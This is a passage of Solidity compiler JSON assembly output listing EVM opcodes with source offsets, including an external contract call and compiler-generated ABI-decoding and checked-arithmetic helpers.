											"end": 598,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 582,
											"end": 603,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 582,
											"end": 603,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 582,
											"end": 603,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 604,
											"end": 609,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 582,
											"end": 610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 582,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 144,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 98,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 86,
											"end": 99,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 132,
											"end": 137,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 150,
											"end": 428,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 266,
											"end": 268,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 254,
											"end": 263,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 245,
											"end": 252,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 241,
											"end": 264,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 237,
											"end": 269,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 282,
											"end": 283,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 279,
											"end": 280,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 272,
											"end": 284,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 325,
											"end": 326,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 403,
											"end": 410,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 383,
											"end": 392,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 379,
											"end": 401,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 296,
											"end": 421,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 530,
											"end": 535,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 510,
											"end": 513,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 503,
											"end": 537,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 549,
											"end": 710,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 549,
											"end": 710,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 651,
											"end": 703,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 697,
											"end": 702,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 651,
											"end": 703,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 651,
											"end": 703,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 651,
											"end": 703,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 651,
											"end": 703,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 646,
											"end": 649,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 639,
											"end": 704,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 629,
											"end": 710,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 629,
											"end": 710,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 629,
											"end": 710,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 716,
											"end": 926,
											"name": "tag",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 716,
											"end": 926,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 716,
											"end": 926,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 841,
											"end": 843,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 830,
											"end": 839,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 826,
											"end": 844,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 818,
											"end": 844,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 818,
											"end": 844,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 854,
											"end": 919,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 916,
											"end": 917,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 905,
											"end": 914,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 901,
											"end": 918,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 892,
											"end": 898,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 854,
											"end": 919,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 854,
											"end": 919,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 854,
											"end": 919,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 854,
											"end": 919,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 808,
											"end": 926,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 808,
											"end": 926,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 808,
											"end": 926,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 808,
											"end": 926,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 808,
											"end": 926,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 932,
											"end": 1184,
											"name": "tag",
											"source": 2,
											"value": "8"
										},
										{
											"begin": 932,
											"end": 1184,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 932,
											"end": 1184,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1078,
											"end": 1080,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1067,
											"end": 1076,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1063,
											"end": 1081,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1055,
											"end": 1081,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1055,
											"end": 1081,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1091,
											"end": 1177,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 1174,
											"end": 1175,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1163,
											"end": 1172,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1159,
											"end": 1176,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1150,
											"end": 1156,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1091,
											"end": 1177,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 1091,
											"end": 1177,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1091,
											"end": 1177,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 1091,
											"end": 1177,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1184,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1184,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1184,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1184,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1184,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1190,
											"end": 1375,
											"name": "tag",
											"source": 2,
											"value": "15"
										},
										{
											"begin": 1190,
											"end": 1375,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1190,
											"end": 1375,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1247,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1265,
											"end": 1266,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1247,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1247,
											"end": 1267,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1247,
											"end": 1267,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1247,
											"end": 1267,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1242,
											"end": 1267,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1242,
											"end": 1267,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1281,
											"end": 1301,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1299,
											"end": 1300,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1281,
											"end": 1301,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1281,
											"end": 1301,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1281,
											"end": 1301,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1281,
											"end": 1301,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1276,
											"end": 1301,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1276,
											"end": 1301,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1320,
											"end": 1321,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1310,
											"end": 1312,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1310,
											"end": 1312,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1325,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1325,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1325,
											"end": 1343,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1325,
											"end": 1343,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1325,
											"end": 1343,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1310,
											"end": 1312,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1310,
											"end": 1312,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1367,
											"end": 1368,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1364,
											"end": 1365,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1360,
											"end": 1369,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 1355,
											"end": 1369,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1355,
											"end": 1369,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1232,
											"end": 1375,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1232,
											"end": 1375,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1232,
											"end": 1375,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1232,
											"end": 1375,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1232,
											"end": 1375,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1381,
											"end": 1572,
											"name": "tag",
											"source": 2,
											"value": "13"
										},
										{
											"begin": 1381,
											"end": 1572,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1381,
											"end": 1572,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1441,
											"end": 1461,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1459,
											"end": 1460,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1441,
											"end": 1461,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1441,
											"end": 1461,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1441,
											"end": 1461,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1441,
											"end": 1461,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1436,
											"end": 1461,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1436,
											"end": 1461,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1475,
											"end": 1495,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1493,
											"end": 1494,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1475,
											"end": 1495,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1475,
											"end": 1495,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1475,
											"end": 1495,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1475,
											"end": 1495,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1470,
											"end": 1495,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1470,
											"end": 1495,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1514,
											"end": 1515,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1511,
											"end": 1512,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1508,
											"end": 1516,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 1505,
											"end": 1507,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1505,
											"end": 1507,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1505,
											"end": 1507,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1519,
											"end": 1537,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1519,
											"end": 1537,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 1519,
											"end": 1537,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1519,
											"end": 1537,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1519,
											"end": 1537,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1505,
											"end": 1507,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1505,
											"end": 1507,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1564,
											"end": 1565,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1561,
											"end": 1562,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1557,
											"end": 1566,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1549,
											"end": 1566,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1549,
											"end": 1566,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1426,
											"end": 1572,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1426,
											"end": 1572,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1426,
											"end": 1572,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1426,
											"end": 1572,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1426,
											"end": 1572,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1578,
											"end": 1668,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 1578,
											"end": 1668,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1578,
											"end": 1668,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1655,
											"end": 1660,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1648,
											"end": 1661,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1641,
											"end": 1662,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1662,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1662,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1668,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1668,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1668,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1668,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1674,
											"end": 1800,
											"name": "tag",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1674,
											"end": 1800,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1674,
											"end": 1800,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1751,
											"end": 1793,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1744,
											"end": 1749,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1740,
											"end": 1794,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1794,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1794,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1719,
											"end": 1800,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1719,
											"end": 1800,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1719,
											"end": 1800,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1719,
											"end": 1800,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1806,
											"end": 1883,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1806,
											"end": 1883,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1806,
											"end": 1883,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1872,
											"end": 1877,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1861,
											"end": 1877,
